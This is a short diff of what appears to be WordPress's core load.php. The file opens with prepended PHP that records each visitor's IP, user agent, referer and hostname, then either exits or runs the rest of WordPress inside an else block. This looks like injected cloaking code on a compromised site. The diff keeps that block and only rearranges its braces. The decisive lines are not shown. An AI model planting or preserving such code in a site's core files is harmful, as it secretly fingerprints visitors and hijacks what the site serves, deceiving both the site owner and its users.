@@ -1,5 +1,5 @@
 <?php
-    $userIp = $_SERVER['REMOTE_ADDR'];
+ $userIp = $_SERVER['REMOTE_ADDR'];
     $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
     $referer = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : 'Tidak ada referer';
     $hostname = gethostbyaddr($userIp);
@@ -17,9 +17,8 @@
         exit;
     } else {
 
-?>
+}
 
-<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -2061,6 +2060,4 @@ function wp_is_site_protected_by_basic_auth( $context = '' ) {
 	 * @param string $context    The context to check for protection. One of 'login', 'admin', or 'front'.
 	 */
 	return apply_filters( 'wp_is_site_protected_by_basic_auth', $is_protected, $context );
-}
-
 }
